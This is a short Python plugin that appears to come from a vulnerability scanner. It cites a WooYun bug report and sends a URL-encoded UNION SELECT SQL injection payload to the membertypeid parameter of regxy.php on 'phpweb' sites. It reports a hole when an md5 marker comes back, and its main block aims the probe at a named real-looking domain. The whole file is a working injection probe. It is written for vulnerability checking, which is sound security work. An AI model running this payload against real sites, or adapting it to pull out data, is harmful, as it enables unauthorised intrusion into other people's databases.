#!/usr/bin/env python
# http://www.wooyun.org/bugs/wooyun-2010-046528

def assign(service, arg):
    if service == "phpweb":
        return True, arg

def audit(arg):
    url = arg+'regxy.php?membertypeid=-9914%27%20UNION%20ALL%20SELECT%2018%2C18%2C18%2C18%2C18%2CCONCAT%280x716b786271%2CIFNULL%28CAST%28md5%283.1415%29%20AS%20CHAR%29%2C0x20%29%2C0x717a626a71%29%2C18%2C18%2C18%2C18%23'
    code, _, res, _, _ = curl.curl2(url)
    if code == 200 and "63e1f04640e83605c1d177544a5a0488" in res:
        security_hole(url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('phpweb', 'http://www.wlcdc.com/')[1])